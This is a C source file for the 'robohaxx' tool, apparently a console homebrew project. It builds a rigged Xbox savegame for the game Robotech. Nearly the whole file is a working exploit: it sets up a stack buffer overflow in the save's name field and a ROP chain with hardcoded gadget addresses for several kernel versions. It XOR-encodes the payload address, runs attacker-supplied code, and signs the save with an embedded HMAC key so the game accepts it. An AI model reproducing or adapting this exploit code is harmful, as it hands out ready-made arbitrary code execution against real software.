#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <sys/types.h>
#include <sys/stat.h>
#include "hmac_sha1.h"

//#define SAVEGAME_DATA_LENGTH 0x2E4
#define SAVEGAME_DATA_LENGTH 0x2048

// the length of the string before overriding eip is, theoretically, fair game to change whatever in
#define STRING_OVERFLOW_LENGTH 0x1FC

// !! this entire datatype must not contain any NULL bytes !!
typedef struct _RobohaxxOverflow_t {
    char overflow[STRING_OVERFLOW_LENGTH];
    uint32_t ret_override; // the address of code to redirect to
    uint32_t more_stack[8]; // stack for our rop chain
} RobohaxxOverflow_t;

#define MAX_PAYLOAD_LENGTH SAVEGAME_DATA_LENGTH - 0x8 - sizeof(RobohaxxOverflow_t)

// "structure" of the hacked save
typedef struct _RobohaxxSave_t {
    uint32_t length;
    uint8_t checksum[0x14];
    union {
        struct {
            uint8_t unk[0x8];
            RobohaxxOverflow_t name;
            uint8_t payload[MAX_PAYLOAD_LENGTH]; // max save length
        } save;
        uint8_t save_bytes[SAVEGAME_DATA_LENGTH];
    };
} RobohaxxSave_t;

// a structure of gadgets to build up our rop chain
typedef struct _ROPStringGadgets {
    uint32_t pop_eax__ret_4;
    uint32_t pop_ecx__pop_ebx__ret_4;
    uint32_t xor_eax_ecx__ret;
    uint32_t jmp_eax;
} ROPStringGadgets;

// gadget address offsets for the 4627 debug kernel
static ROPStringGadgets gadgets_4627_debug = {
    .pop_eax__ret_4 = 0x80041cb0,
    .pop_ecx__pop_ebx__ret_4 = 0x8003e241,
    .xor_eax_ecx__ret = 0x800199eb,
    .jmp_eax = 0x8001bf2f
};
// gadget address offsets for the 3944 retail kernel
static ROPStringGadgets gadgets_3944 = {
    .pop_eax__ret_4 = 0x800238b9,
    .pop_ecx__pop_ebx__ret_4 = 0x8002fba1,
    .xor_eax_ecx__ret = 0x80013f6b,
    .jmp_eax = 0x800155b7
};
// gadget address offsets for the 4034 retail kernel
static ROPStringGadgets gadgets_4034 = {
    .pop_eax__ret_4 = 0x800238d9,
    .pop_ecx__pop_ebx__ret_4 = 0x8002fba1,
    .xor_eax_ecx__ret = 0x80013f6b,
    .jmp_eax = 0x80010edb
};
// gadget address offsets for the 4817 retail kernel
static ROPStringGadgets gadgets_4817 = {
    .pop_eax__ret_4 = 0x80022619,
    .pop_ecx__pop_ebx__ret_4 = 0x8002e981,
    .xor_eax_ecx__ret = 0x80012c2b,
    .jmp_eax = 0x80014277
};
// gadget address offsets for the 5101 retail kernel
static ROPStringGadgets gadgets_5101 = {
    .pop_eax__ret_4 = 0x80022629,
    .pop_ecx__pop_ebx__ret_4 = 0x8002e9c1,
    .xor_eax_ecx__ret = 0x80012c3b,
    .jmp_eax = 0x80014287
};
// gadget address offsets for the 5530, 5713 and 5838 retail kernels
static ROPStringGadgets gadgets_5530_5713_5838 = {
    .pop_eax__ret_4 = 0x800227f0,
    .pop_ecx__pop_ebx__ret_4 = 0x8002ecc9,
    .xor_eax_ecx__ret = 0x80012bbb,
    .jmp_eax = 0x80013c33
};

// the selected gadget offsets
static ROPStringGadgets *gadgets = NULL;

// static address where the savegame gets loaded straight from the file into
#define EUR_SAVEGAME_ADDRESS 0x0041E20C
#define USA_SAVEGAME_ADDRESS 0x003AF5CC
static uint32_t savegame_address = 0;

// save file signature key, generated from HMAC_SHA1(XboxSignatureKey, RobotechXBEKey)[0:16]
#define SIG_KEY_LEN 0x10
static const uint8_t game_sig_key[SIG_KEY_LEN] = { 0x82, 0xe1, 0x75, 0x30, 0x4a, 0x3f, 0x85, 0xc1, 0xd1, 0x85, 0xc1, 0x23, 0x25, 0xfb, 0x11, 0x0d };

static char *output_filename = "game.xsv";

static int print_usage(char *filename) {
    printf("usage: %s [path to payload] [U/E] [kernel version or path to offsets] [optional output path, default game.xsv]\n", filename);
    printf("       supported built-in kernel versions are 3944, 4034, 4817, 5101, 5530, 5713, 5838 and (debug) 4627\n");
    return -1;
}
static int print_error(char *error) {
    fprintf(stderr, "error: %s\n", error);
    return -1;
}

static void hexdump(const uint8_t *data, const size_t len) {
    for (size_t i = 0; i < len; i++)
        printf("%02x", data[i]);
}

int main(int argc, char **argv) {
    printf("robohaxx game.xsv builder by InvoxiPlayGames\n"
           "https://github.com/InvoxiPlayGames/robohaxx\n\n");
    if (argc < 4)
        return print_usage(argv[0]);

    // make sure the provided region is correct, and set the target address
    if (strlen(argv[2]) != 1) 
        return print_error("argument too long to be a region");
    if (argv[2][0] == 'E' || argv[2][0] == 'e')
        savegame_address = EUR_SAVEGAME_ADDRESS;
    else if (argv[2][0] == 'U' || argv[2][0] == 'u')
        savegame_address = USA_SAVEGAME_ADDRESS;
    else
        return print_error("invalid region provided, must be E or U");
    printf("savegame address: %08x\n", savegame_address);

    // load up the offsets
    if (strcmp(argv[3], "4627") == 0)
        gadgets = &gadgets_4627_debug;
    else if (strcmp(argv[3], "3944") == 0)
        gadgets = &gadgets_3944;
    else if (strcmp(argv[3], "4034") == 0)
        gadgets = &gadgets_4034;
    else if (strcmp(argv[3], "4817") == 0)
        gadgets = &gadgets_4817;
    else if (strcmp(argv[3], "5101") == 0)
        gadgets = &gadgets_5101;
    else if (strcmp(argv[3], "5530") == 0 ||
             strcmp(argv[3], "5713") == 0 ||
             strcmp(argv[3], "5838") == 0)
        gadgets = &gadgets_5530_5713_5838;
    else {
        gadgets = malloc(sizeof(ROPStringGadgets));
        if (gadgets == NULL)
            return print_error("failed to allocate memory for gadget file");
        // open the gadget file and load it into memory
        FILE *gadgets_fp = fopen(argv[3], "rb");
        if (gadgets_fp == NULL)
            return print_error("gadgets file could not be opened");
        if (fread(gadgets, 1, sizeof(ROPStringGadgets), gadgets_fp) != sizeof(ROPStringGadgets))
            return print_error("gadgets file is not the correct size");
        fclose(gadgets_fp);
        printf("loaded gadgets from %s\n", argv[3]);
    }

    printf("using gadgets:\n");
    printf("   pop eax; ret 4; = 0x%08x\n", gadgets->pop_eax__ret_4);
    printf("   pop ecx; pop ebx; ret 4; = 0x%08x\n", gadgets->pop_ecx__pop_ebx__ret_4);
    printf("   xor eax, ecx; ret; = 0x%08x\n", gadgets->xor_eax_ecx__ret);
    printf("   jmp eax; = 0x%08x\n", gadgets->jmp_eax);
    
    // read the payload file and get the filesize
    FILE *payload_fp = fopen(argv[1], "rb");
    if (payload_fp == NULL)
        return print_error("payload file could not be opened");
    fseek(payload_fp, 0, SEEK_END);
    long payload_len = ftell(payload_fp);
    fseek(payload_fp, 0, SEEK_SET);
    printf("payload length: %li\n", payload_len);

    // we can't have this
    if (payload_len > MAX_PAYLOAD_LENGTH || payload_len < 2)
        return print_error("payload is too large or short");

    // allocate a buffer for the payload and read it
    uint8_t *payload = malloc(payload_len);
    if (payload == NULL)
        return print_error("failed to allocate buffer for payload");
    if (fread(payload, 1, payload_len, payload_fp) < payload_len)
        return print_error("failed to read entire payload into memory");
    fclose(payload_fp);

    // allocate a buffer for our savegame
    RobohaxxSave_t *save = malloc(sizeof(RobohaxxSave_t));
    if (save == NULL)
        return print_error("failed to allocate buffer for our savegame");
    // whoops! all zeroes
    memset(save, 0, sizeof(RobohaxxSave_t));

    uint32_t target_address = (savegame_address + 0x8 + sizeof(RobohaxxOverflow_t));
    printf("payload target address: %08x\n", target_address);

    // pad out the string and fill in the stack values with A's
    memset(save->save.name.overflow, 'A', sizeof(save->save.name.overflow));
    memset(save->save.name.more_stack, 'A', sizeof(save->save.name.more_stack));

    // value to XOR the payload target address with
    static uint32_t xor_key = 0x367036ff;

    // build up our rop chain
    // pop our xor'd payload address into eax
    save->save.name.ret_override = gadgets->pop_eax__ret_4;
    save->save.name.more_stack[0] = target_address ^ xor_key;
    // pop our xor key into ecx and more_stack[4] into ebx
    save->save.name.more_stack[1] = gadgets->pop_ecx__pop_ebx__ret_4;
    save->save.name.more_stack[3] = xor_key;
    // xor the address in eax with the key in ecx
    save->save.name.more_stack[5] = gadgets->xor_eax_ecx__ret; // xor eax, ecx; ret;
    // then jump to eax, now containing the payload
    save->save.name.more_stack[7] = gadgets->jmp_eax; // jmp eax

    // run through our name and make sure there are no null bytes
    uint8_t *ptr = (uint8_t *)&save->save.name;
    for (int i = 0; i < sizeof(save->save.name); i++)
        if (ptr[i] == 0x00)
            return print_error("null bytes detected in stack overflow. :/");

    // straight copy the payload to the extra data in the save
    memcpy(save->save.payload, payload, payload_len);

    // set the length
    save->length = SAVEGAME_DATA_LENGTH;
    // prepare the xbox savegame signature
    HMAC_SHA1(game_sig_key, SIG_KEY_LEN, save->save_bytes, save->length, save->checksum);

    printf("savegame signature: ");
    hexdump(save->checksum, sizeof(save->checksum));
    printf("\n");
    
    if (argc >= 5) output_filename = argv[4];

    printf("writing savegame to %s\n", output_filename);

    FILE *gci_fp = fopen(output_filename, "wb+");
    if (gci_fp == NULL)
        return print_error("output file could not be opened");
    if (fwrite(save, sizeof(RobohaxxSave_t), 1, gci_fp) < 1)
        return print_error("failed to write to output file");
    fclose(gci_fp);

    printf("successfully written output savegame!\n");

    // clean up and free everything
    free(save);
    free(payload);
    return 0;
}
